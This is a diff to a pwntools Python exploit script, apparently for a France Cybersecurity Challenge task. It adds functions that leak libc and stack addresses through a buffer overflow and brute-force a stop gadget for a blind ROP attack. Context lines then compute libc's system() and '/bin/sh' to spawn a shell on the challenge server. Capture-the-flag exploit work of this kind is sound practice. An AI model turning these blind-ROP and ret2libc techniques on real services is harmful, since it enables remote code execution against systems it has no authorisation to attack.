@@ -10,6 +10,49 @@ from pwn import *
 from Crypto.Util.number import bytes_to_long
 import os
 
+def leakAddr():
+    c = b'a'
+    pld = c * 8 # starts with 0x7f and ends with a37 -> 0x7f2fd6d2ca37 - libc
+    pld = c * 24 # starts with 0x7ff and end with 0 -> 0x7fff753ff490 - stack
+    pld = c * 32 # starts with 0x7ff and end with 0 -> 0x7ffc1b9b1330 - stack
+    pld = c * 40 # addr = 0x4006cc
+
+    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+    r.recv(timeout=0.1)
+    r.send(pld)
+    leaks = r.recv(timeout=0.1).split()
+
+    bye = leaks[-1][leaks[-1].rfind(c) + 1:-4][::-1]
+    l = []
+    for i in range(0, len(bye), 6):
+        l.append(bytes_to_long(bye[i:i + 6]))
+    return l[0]
+
+def getStopGadget(leak):
+    L = []
+    start = 0x500
+    end = start + 0x300
+    for i in range(start, end):
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+        try:
+            addr = base_addr + i
+            log.info(f'GetStopGadget -> trying addr = {hex(addr)}')
+            pld = b'c' * 40
+            pld += p64(addr)
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+            if ref in res:
+                L.append(addr)
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+    return L
+
 def getBropGadget(stop_gadget, false_positives):
     start = 0
     end = start + 0x1000
@@ -159,7 +202,7 @@ rec = r.recv()
 libc_leak = bytes_to_long(rec[rec.index(b'@')+1:rec.index(b'\n' + ref)][::-1])
 log.success(f'libc_leak = {hex(libc_leak)}')
 
-libc = ELF('./libc6_2.19-18_deb8u10_amd64.so')
+libc = ELF('src/libc6_2.19-18_deb8u10_amd64.so')
 libc_base = libc_leak - libc.sym['puts']
 system = libc_base + libc.sym['system']
 binsh = libc_base + next(libc.search(b'/bin/sh'))
